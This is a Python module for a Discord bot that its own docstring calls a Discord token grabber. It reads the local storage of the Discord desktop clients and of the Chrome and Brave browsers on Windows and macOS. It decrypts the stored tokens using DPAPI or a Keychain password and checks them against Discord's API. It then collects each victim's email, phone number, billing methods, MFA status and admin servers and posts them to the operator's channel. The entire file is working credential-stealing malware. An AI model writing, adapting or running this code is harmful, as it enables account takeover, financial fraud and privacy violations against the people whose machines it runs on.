"""
commands/grabber.py - Discord token grabber (Windows & macOS support).
"""

import base64
import json
import os
import re
import platform
import subprocess
import requests
from discord import Embed
from discord.ext import commands

# Dependencies for macOS decryption
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
except ImportError:
    pass

from config import IS_WINDOWS
from utils import (
    in_correct_channel, 
    is_authorized, 
    log_message, 
    wrong_channel, 
    current_time
)

if IS_WINDOWS:
    from config import CryptUnprotectData


class TokenExtractor:
    """Scans browser storage paths for Discord tokens across Windows and macOS."""

    BASE_URL = "https://discord.com/api/v9/users/@me"
    RE_PLAIN = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
    RE_ENC = r"dQw4w9WgXcQ:[^\"]*"

    def __init__(self):
        self.tokens: list[str] = []
        self.uids: list[str] = []
        self._extract()

    # ── macOS Specific Logic ──────────────────────────────────────────────
    def _get_mac_master_key(self):
        """Retrieves the Discord Safe Storage key from the macOS Keychain."""
        try:
            # This triggers a system prompt for the user's password
            cmd = ["security", "find-generic-password", "-wa", "Discord Safe Storage"]
            password = subprocess.check_output(cmd, stderr=subprocess.STDOUT).strip()
            
            # macOS uses PBKDF2 to derive the 16-byte AES key
            return PBKDF2(password, b"saltysalt", 16, count=1003)
        except Exception:
            return None

    def _decrypt_mac(self, buff, master_key):
        """Decrypts AES-GCM encrypted tokens for macOS."""
        try:
            iv = b" " * 12  # Standard IV for macOS Discord
            payload = buff[3:]  # Strip 'v10' prefix
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload)[:-16].decode().strip()
        except Exception:
            return None

    # ── Token extraction ───────────────────────────────────────────────────
    def _extract(self):
        home = os.path.expanduser("~")
        mac_key = self._get_mac_master_key() if platform.system() == "Darwin" else None
        
        if IS_WINDOWS:
            appdata = os.getenv("localappdata", "")
            roaming = os.getenv("appdata", "")
            paths = {
                "Discord": roaming + "\\discord\\Local Storage\\leveldb\\",
                "Discord Canary": roaming + "\\discordcanary\\Local Storage\\leveldb\\",
                "Discord PTB": roaming + "\\discordptb\\Local Storage\\leveldb\\",
                "Chrome": appdata + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
                "Brave": appdata + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\"
            }
        else:  # macOS
            paths = {
                "Discord": f"{home}/Library/Application Support/discord/Local Storage/leveldb/",
                "Discord Canary": f"{home}/Library/Application Support/discordcanary/Local Storage/leveldb/",
                "Discord PTB": f"{home}/Library/Application Support/discordptb/Local Storage/leveldb/",
                "Chrome": f"{home}/Library/Application Support/Google/Chrome/Default/Local Storage/leveldb/",
                "Brave": f"{home}/Library/Application Support/BraveSoftware/Brave-Browser/Default/Local Storage/leveldb/"
            }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            
            for fname in os.listdir(path):
                if fname[-3:] not in ("log", "ldb"):
                    continue
                
                filepath = os.path.join(path, fname)
                for line in self._read_lines(filepath):
                    # Encrypted tokens (Desktop clients)
                    for y in re.findall(self.RE_ENC, line):
                        try:
                            clean_payload = base64.b64decode(y.split("dQw4w9WgXcQ:")[1])
                            if IS_WINDOWS:
                                _app = name.replace(" ", "").lower()
                                win_key = self._master_key_win(roaming + f"\\{_app}\\Local State")
                                token = self._decrypt_win(clean_payload, win_key)
                            else:
                                token = self._decrypt_mac(clean_payload, mac_key)
                            
                            if token: self._add_if_valid(token)
                        except:
                            continue
                    
                    # Plain tokens (Browsers)
                    for token in re.findall(self.RE_PLAIN, line):
                        self._add_if_valid(token)

    @staticmethod
    def _read_lines(filepath: str) -> list[str]:
        try:
            with open(filepath, "r", errors="ignore") as f:
                return [l.strip() for l in f if l.strip()]
        except Exception:
            return []

    def _add_if_valid(self, token: str):
        if not token or token in self.tokens:
            return
        r = requests.get(self.BASE_URL, headers={"Authorization": token})
        if r.status_code == 200:
            uid = r.json().get("id")
            if uid and uid not in self.uids:
                self.tokens.append(token)
                self.uids.append(uid)

    # Windows Specific Helpers
    def _decrypt_win(self, buff, master_key):
        iv, payload = buff[3:15], buff[15:]
        decrypted = AES.new(master_key, AES.MODE_GCM, iv).decrypt(payload)
        return decrypted[:-16].decode()

    def _master_key_win(self, path):
        if not os.path.exists(path): return None
        with open(path, "r", encoding="utf-8") as f:
            content = f.read()
        if "os_crypt" not in content: return None
        state = json.loads(content)
        key = base64.b64decode(state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(key, None, None, None, 0)[1]


def _build_embeds(tokens: list[str]) -> list:
    results = []
    for token in tokens:
        try:
            u = requests.get("https://discord.com/api/v8/users/@me", headers={"Authorization": token})
            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={"Authorization": token})
            g = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers={"Authorization": token})
            u.raise_for_status()
            
            ud = u.json()
            username = f"{ud['username']}#{ud.get('discriminator', '0000')}"
            user_id = ud["id"]
            nitro = {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(ud.get("premium_type", 0), "None")
            email = ud.get("email", "None")
            phone = ud.get("phone", "None")
            mfa = ud.get("mfa_enabled", False)
            avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{ud['avatar']}.png" if ud.get("avatar") else None

            billing = ", ".join(m["type"] for m in b.json()) if b.ok and b.json() else "None"
            hq = [f"**{gd['name']}** | `{gd['id']}`" for gd in g.json() if int(gd["permissions"]) & 0x8 and gd.get("approximate_member_count", 0) >= 100]

            embed = Embed(title=f"{username} ({user_id})", color=0x0084FF)
            if avatar: embed.set_thumbnail(url=avatar)
            embed.add_field(name="📜 Token:", value=f"```{token}```", inline=False)
            embed.add_field(name="💎 Nitro:", value=nitro, inline=True)
            embed.add_field(name="💳 Billing:", value=billing, inline=True)
            embed.add_field(name="🔒 MFA:", value=str(mfa), inline=True)
            embed.add_field(name="📧 Email:", value=email, inline=False)
            embed.add_field(name="📳 Phone:", value=phone, inline=False)
            embed.add_field(name="🏰 HQ Guilds:", value="\n".join(hq) if hq else "None", inline=False)
            results.append(embed)
        except Exception as err:
            results.append(f"Error processing token: {err}")
    return results


class GrabberCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="grab_discord")
    @commands.check(is_authorized)
    async def grab_discord(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return

        supported = ["Darwin", "Windows"]
        if platform.system() not in supported:
            await log_message(ctx, f"❌ Unsupported OS: {platform.system()}", duration=10)
            return

        await ctx.send("🔄 Extracting Discord tokens...")
        try:
            import asyncio
            asyncio.create_task(self._run_grabber(ctx))
        except Exception as e:
            await log_message(ctx, f"Error: {e}", duration=10)

    async def _run_grabber(self, ctx):
        tokens = TokenExtractor().tokens
        if not tokens:
            await ctx.send("No tokens found.")
            return
        
        embeds = _build_embeds(tokens)
        for item in embeds:
            if isinstance(item, Embed):
                await ctx.send(embed=item)
            else:
                await ctx.send(item)
        await ctx.send("✅ Extraction complete.")


async def setup(bot):
    await bot.add_cog(GrabberCommands(bot))
